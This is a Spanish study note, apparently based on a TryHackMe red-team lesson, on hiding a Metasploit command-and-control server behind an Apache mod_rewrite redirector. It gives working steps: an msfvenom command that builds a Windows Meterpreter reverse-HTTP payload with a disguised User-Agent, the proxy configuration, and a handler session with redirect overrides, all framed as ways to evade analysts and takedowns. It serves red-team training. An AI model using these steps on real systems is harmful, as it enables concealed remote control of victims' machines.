---
layout: apunte
title: "6. Advanced C2 Setups"
---

<h2>Siempre se Puede Mejorar</h2>
Como puedes haber adivinado, Metasploit no es tan buen servidor C2 para operaciones de adversario avanzadas. No es flexible, no puedes configurar que los agentes hagan beacon cada X segundos con Y jitter... Un NGFW podría fácilmente darse cuenta de este tráfico C2, viendo su flujo constante de tráfico. Además, cualquiera podría conectarse a un listener HTTP/HTTPS y averiguar lo que está pasando.

----------------------------------------
<h2>Redirectores Command and Control</h2>
<h3>¿Qué es un Redirector?</h3>
Antes de adentrarnos en configurar un redirector, debemos preguntarnos qué es. Un redirector hace exactamente lo que parece. Es un servidor que redirige las peticiones HTTP/HTTPS basado en información del body. En los sistemas de producción, puede que veas un redirector en forma de balanceador de carga. Este servidor suele correr en Apache2 o NGINX.

De vuelta en Metasploit, podemos realizar unas configuraciones básicas para permitir configuraciones más avanzadas. En esta tarea configuraremos un redirector. Normalmente esta configuración se realiza en múltiples hosts; el propósito de esto es esconder el verdadero servidor de Command and Control. El diagrama de abajo ilustra cómo las comunicaciones entre la víctima y el servidor C2 ocurren.

!**Pasted image 20260517011754.png**

Normalmente, cuando tienes una llamada de vuelta a C2, puedes configurar el host de llamada a un Dominio, digamos *admin.tryhackme.com*. Es muy común que tu servidor C2 sea reportado, cuando un usuario realiza una queja. Normalmente el servidor es tirado bastante rápido. Puede tardar entre 3 y 24 horas.

Configurar un redirector asegura que cualquier información que puedas haber recolectado durante el engagement esté segura. Pero ¿cómo hace esto que el servidor C2 no sea tirado? Seguro que si alguien hiciera fingerprint de Cobalt Strike en tu servidor C2, alguien rellenaría una queja y te tumbarían el servidor. Es cierto, por eso se coloca un Firewall que sólo permita la comunicación a y desde tu redirector para mitigar cualquier riesgo potencial.

!**Pasted image 20260517012403.png**

-----------------------------------------------
<h2>¿Cómo se Configura un Redirector?</h2>
Antes de adentrarnos en la configuración del redirector, debemos entender cómo se configura uno. En Apache, usaremos un módulo llamado *"mod_rewrite*. Este módulo nos permite escribir reglas para redirigir peticiones a hosts internos o externos basado en headers HTTP específicos. Necesitaremos usar varios módulos para configurar nuestro redirector:

- rewrite
- proxy
- proxy_http
- headers

Puedes instalar Apache y habilitarlo de la siguiente manera (como root):

```bash
apt install apache2 && a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
```

Usando Meterpreter, tenemos la habilidad de configurar varios aspectos de la petición HTTP, por ejemplo, el User-Agent. Es muy común que un actor malicioso haga un ajuste sutil al User-Agent en sus payloads HTTP/HTTPS de C2. Está en todas las peticiones HTTP y todas se ven más o menos igual, y hay una alta probabilidad de que un analista pase por alto una string de User-Agent modificada. Para esta demostración, generaremos un payload HTTP de Meterpreter Reverse usando MSFVenom, luego inspeccionaremos la petición HTTP en Wireshark.

------------------------------------------------
<h2>Generar un Payload con Headers Modificados</h2>
```bash
root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 454 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Después de generar el ejecutable y transferirlo a la víctima, abrimos Wireshark y usamos el filtro `HTTP` para ver sólo peticiones HTTP. Después de que haya comenzado a capturar paquetes, ejecuta el binario en el sistema de la víctima. Verás que hay una petición HTTP que viene con el User-Agent modificado.

!**Pasted image 20260517142450.png**

Ahora que ya tenemos un campo que podemos controlar en la petición HTTP, vamos a crear una regla en Apache2 mod_rewrite que filtre el User-Agent *"NotMeterpreter"* y lo redirija a nuestro servidor C2 Metasploit.

-------------------------------------
<h2>Modificar el Archivo de Configuración de Apache</h2>
Esta sección puede sonar intimidante, pero es más fácil de lo que parece; estaremos tomando el archivo de configuración por defecto de Apache y modificándolo para nuestra ventaja. En sistemas basados en Debian, el archivo de configuración por defecto puede ser encontrado en `/etc/apache2/sites-available/000-default.conf`.

```bash
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        <Directory>
                AllowOverride All
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Ahora que tenemos una idea general de cómo se estructura en archivo de configuración de Apache2, vamos a añadir algunas lineas para habilitar el motor Rewrite, añadir una nueva condición, y por último pasar por el proxy de Apache2. Suena complejo, pero es bastante simple.

Para habilitar el [Motor Rewrite](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) debemos añadir `RewriteEngine On` en una nueva línea de la sección VirtualHost.

Ahora usaremos la condición Rewrite apuntando al User-Agent de HTTP. Para una lista completa de objetivos de peticiones HTTP, consulta la [documentación de mod_rewrite](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html). Como sólo queremos que el User-Agent coincida con *"NotMeterpreter"*, necesitamos usar algunas expresiones regulares para capturar esto; añadir `^` al principio de la string u `$` al final de la seria, nos da `"^NotMeterpreter$"`. Esta Regex sólo capturará el User-Agent NotMeterpreter. Podemos añadir esta línea: `RwriteCond%{HTTP_USER_AGENT} "^NotMeterpreter$"` a nuestro archivo de configuración para permitir, sólo peticiones con el User-Agent definido, en Metasploit.

Por último, debemos redirigir la petición a través de Apache2 y nuestro proxy hacia Metasploit. Para hacer esto, debemos usar la funcionalidad ProxyPass del [módulo mod_proxy](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html) de Apache. Para hacer esto, necesitamos especificar la URI base a la que la petición se redirigirá y el objetivo al que queremos redirigir la petición. Esto variará pero es la dirección IP de tu servidor C2.

```bash
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'

<VirtualHost *:80>

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	<Directory>
		AllowOverride All
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

-------------------------------------------
<h2>Configurar Exploit/Multi/Handler</h2>
Para configurar Meterpreter correctamente, necesitamos hacer algunas modificaciones. Debemos configurar LHOST a la interfaz de la máquina de la que esperamos las conexiones (la interfaz pública del redirector). EL LPORT al puerto que queramos. Estas opciones tendrán que ser duplicadas para `ReverseListenerBindAddress` y `ReverseListenerBindPort`.

Después, necesitamos configurar el OverrideLHOST que es el valor que será la IP del redirector o nombre de dominio. Después de eso, necesitamos configurar el OverrideLPORT que será el puerto en el que corre HTTP o HTTPS en el redirector. Por último, debemos configurar OverrideRequestHost a true. Esto hará que Meterpreter responda con información OverrideHost, para que todas las queries pasen por el redirector y no por tu servidor C2. Ahora que entiendes lo que debe ser configurado, vamos a adentrarnos en ello:

```bash
root@kali$ msfconsole
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
ReverseListenerBindPort => 8080
msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
OverrideLHOST => 192.168.0.44
msf6 exploit(multi/handler) > set OverrideLPORT 80
OverrideLPORT => 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
HttpUserAgent => NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
OverrideRequestHost => true
msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on http://127.0.0.1:8080
[*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 3 opened (127.0.0.1:8080 -> 127.0.0.1 ) at 2022-02-11 02:09:24 -0500
```

Después de que todo haya sigo configurado, ejecutar la reverse shell de Meterpreter debería ahora hacer proxy en todas las comunicaciones a través del redirector. 

!**Pasted image 20260517145134.png**

